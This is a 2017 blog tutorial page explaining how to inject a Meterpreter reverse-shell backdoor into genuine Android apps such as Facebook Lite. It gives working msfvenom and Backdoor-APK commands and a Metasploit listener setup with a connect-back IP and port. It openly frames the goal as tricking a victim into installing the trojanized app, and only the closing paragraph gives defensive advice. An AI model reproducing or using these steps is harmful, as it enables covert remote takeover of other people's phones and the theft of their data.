<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="https://gmpg.org/xfn/11" rel="profile" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />

  <title>
    
      Injecting Backdoor in Android Application (APK) &middot; Greycel
    
  </title>

  


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/css/main.css" />
  

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
<link rel="shortcut icon" href="/favicon.ico" />

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />

  <!-- Additional head bits without overriding original head -->
</head>


  <body class="post">

    <div id="sidebar">
  <header>
    <div class="site-title">
      <a href="/">
        
          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
  <path d="M0 0h24v24H0z" fill="none"/>
  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
</svg></span>
        
        Greycel
      </a>
    </div>
    <p class="lead"></p>
  </header>
  <nav id="sidebar-nav-links">
  
    <a class="home-link "
        href="/">Home</a>
  
  

  

  


  

  
    
  

  
    
  

  
    
      <a class="page-link "
          href="/about.html">About</a>
    
  

  
    
  

  

  
    
  

  
    
  

  
    
  


  


  

  
    
      <a class="category-link "
          href="/category/Malware_Analysis.html">Malware Analysis</a>
    
  

  
    
      <a class="category-link "
          href="/category/Pentest.html">Pentest</a>
    
  

  
    
  

  
    
  

  

  
    
  

  
    
  

  
    
  


  <!-- Optional additional links to insert in sidebar nav -->
</nav>


  

  <nav id="sidebar-icon-links">
  

  <a id="subscribe-link"
     class="icon" title="Subscribe" aria-label="Subscribe"
     href="/feed.xml">
    <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <circle cx="6.18" cy="17.82" r="2.18"/>
    <path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/>
</svg>
  </a>

  
  
  
  

  
    <a id="tags-link"
       class="icon"
       title="Tags" aria-label="Tags"
       href="/tags.html">
      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
    </a>
  

  
    <a id="search-link"
       class="icon"
       title="Search" aria-label="Search"
       href="/search.html">
      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
    <path d="M0 0h24v24H0z" fill="none"/>
</svg>
    </a>
  

  <!-- Optional additional links to insert for icons links -->
</nav>

  <p>
  &copy; 2019.
  <a href="/LICENSE.md">MIT License.</a>
</p>

</div>

    <main class="container">
      <header>
  <h1 class="post-title">Injecting Backdoor in Android Application (APK)</h1>
</header>
<div class="content">
  <div class="post-meta">
  <span class="post-date">28 Apr 2017</span>
  <span class="post-categories">
    
      &bull;

      
      
      

      
        <a href="/category/Pentest.html">
          Pentest
        </a>
      
    
  </span>
</div>


  <div class="post-body">
    <p>Lets assuming that we have created an APK with reverse shell payload and somehow installed it on victim’s phone, which upon execution would establish a direct connection to the victim’s phone.</p>

<p>Since the generated APK only contains the payload that doesn’t do anything when clicked and even the size would be in KB’s which looks very much suspicious and the victim would uninstall it immediately or doesn’t even install it.</p>

<p>In order to make the app look legit, we would inject our meterperter reverse shell payload in genuine android apps like facebook, adobe reader, whatsapp. This way the app appears to be legit which the victim installs and gets what he expected… we get the shell..:-)</p>

<hr />

<h3 id="prerequisites">Prerequisites:</h3>
<ul>
<li>In this article, we'd be using 64bit kali linux to build our backdoored APK. Before we start make sure below listed packages are being installed in the machine, if not execute below command from the terminal:

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="n">lib32stdc</span><span class="o">++</span><span class="mi">6</span> <span class="n">lib32ncurses5</span> <span class="n">lib32z1</span></code></pre></figure>
 </li>
<img src="/public/android01.jpg" />

<li>Apktool, this utility does come with kali linux if not check and update it. To install/update "apktool" following the instruction  <a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank">@ibotpeaches</a>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">apktool</span> <span class="o">-</span><span class="n">v</span>    <span class="c1">#Check apktool version</span></code></pre></figure>
 </li>
</ul>

<hr />

<h3 id="ways-to-inject-an-android-apk-file">Ways to Inject an Android APK File</h3>

<div class="message">
Ther are different ways to inject our backdoor into an APK, we'll be using below listed utilities to build our malicious APK allowing an attacker to compromise victim's phone remotely
<ul>
<li>MSFvenom</li>
<li>Backdoor-APK</li>
</ul>
</div>

<p><strong> Injecting Payload with msfveom </strong></p>

<p>Assuming we already have a downloaded android apk, we use it as a template to inject our reverse shell. Below command would allow us to inject the backdoor into original apk, which upon execution connects back to the IP specified within the payload.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">msfvenom</span> <span class="o">--</span><span class="n">platform</span> <span class="n">android</span> <span class="o">-</span><span class="n">x</span> <span class="n">facebook_lite</span><span class="o">.</span><span class="n">apk</span> <span class="o">-</span><span class="n">p</span> <span class="n">android</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="mf">192.168.11.187</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">4444</span> <span class="o">-</span><span class="n">o</span> <span class="n">facebook_lite_bc</span><span class="o">.</span><span class="n">apk</span></code></pre></figure>

<p><img src="/public/fblite01.jpg" /></p>

<p>Now that we have our APK ready with the injected reverse shell payload, all you have to do is send the file to the victim and trick him to install the app.</p>

<p><img src="/public/f00.jpg" />
<img src="/public/f01.jpg" /></p>

<p>On the other hand keep the listener ready for the incoming connection using metasploit exploit/multi/handler. Once the victim installs and opens the app we would get a shell spawned.</p>

<p><img src="/public/shell01.jpg" /></p>

<hr />
<p><strong> Injecting Payload with “Backdoor-APK” </strong></p>

<p>Another utility that can be used in backdooring an android app is “Backdoor-APK”. Behind the scene, this utility uses “msfvenom” and does the same by automating the process making it much easier to inject the payload into android APK and can be downloaded from github repository.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">dana</span><span class="o">-</span><span class="n">at</span><span class="o">-</span><span class="n">cp</span><span class="o">/</span><span class="n">backdoor</span><span class="o">-</span><span class="n">apk</span><span class="o">.</span><span class="n">git</span></code></pre></figure>

<p><img src="/public/bc01.jpg" /></p>

<p>Having the downloaded Original APK and Backdoor-APK in same folder, execute the below command in the terminal which will prompt you to select the payload and details of the connect back IP and Port.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">./</span><span class="n">backdoor</span><span class="o">-</span><span class="n">apk</span><span class="o">.</span><span class="n">sh</span> <span class="n">facebook_lite</span><span class="o">.</span><span class="n">apk</span></code></pre></figure>

<p><img src="/public/bc02.jpg" /></p>

<p>Once the required details are been provided, utility start injecting the reverse shell payload within the APK.</p>

<p><img src="/public/bc03.jpg" /></p>

<p>On the other hand start the listener for incoming connection using metasploit multi handler.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
<span class="nb">set</span> <span class="n">payload</span> <span class="n">android</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
<span class="nb">set</span> <span class="n">lhost</span> <span class="mf">192.168.11.187</span>
<span class="nb">set</span> <span class="n">lport</span> <span class="mi">4444</span>
<span class="n">exploit</span></code></pre></figure>

<p>As expected we would have our final backdoored APK ready in “backdoor-apk -&gt; original -&gt; dist” folder, which we send to the victim and trick him to install it.</p>

<p><img src="/public/bc04.jpg" /></p>

<p>Once the victim installs and opens the app we would receive a meterpreter session.</p>

<h2><img src="/public/f02.jpg" /></h2>

<h3 id="conclusion">Conclusion</h3>

<p>Its is highly recommended to not to download and install apps from unknown sources and never enable the option “install from unkown sources” under “Setting -&gt; Security”.
Install proper antivirus and make sure you never download or click url’s from unkown sources.</p>

<hr />

    



<div class="post-tags">
  
    
    <a href="/tags.html#apktool">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">apktool</span>
    </a>
  
    
    <a href="/tags.html#msfvenom">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">msfvenom</span>
    </a>
  
    
    <a href="/tags.html#backdoor-apk">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">backdoor-apk</span>
    </a>
  
    
    <a href="/tags.html#meterpreter">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">meterpreter</span>
    </a>
  
</div>
  </div>

  <!-- 
  <section class="comments">
    <h2>Comments</h2>
    
  <p>
    You are seeing this because your Disqus shortname is not properly set. To
    configure Disqus, you should edit your <code>_config.yml</code> to include
    either a <code>disqus.shortname</code> variable.
  </p>

  <p>
    If you do not wish to use Disqus, override the
    <code>comments.html</code> partial for this theme.
  </p>


  </section>
  -->

  <section class="related">
  <h2>Related Posts</h2>
  <ul class="posts-list">
    
      <li>
        <h3>
          <a href="/malware-analysis/2017/11/08/ML_0day_Detection_Blusapphire.html">
            ZeroDay Detection with Machine Learning(ML) Blusapphire
            <small>08 Nov 2017</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/malware-analysis/2017/10/28/BadRaddit_Blusapphire_Analysis.html">
            BadRabbit Closer Look with BluSapphire
            <small>28 Oct 2017</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/pentest/2017/04/16/Custom-Shellcode-Encoder.html">
            Custom Shellcode Encoder/Decoder (Rolling XOR)
            <small>16 Apr 2017</small>
          </a>
        </h3>
      </li>
    
  </ul>
</section>

</div>

    </main>

    <!-- Optional footer content -->

  </body>
</html>
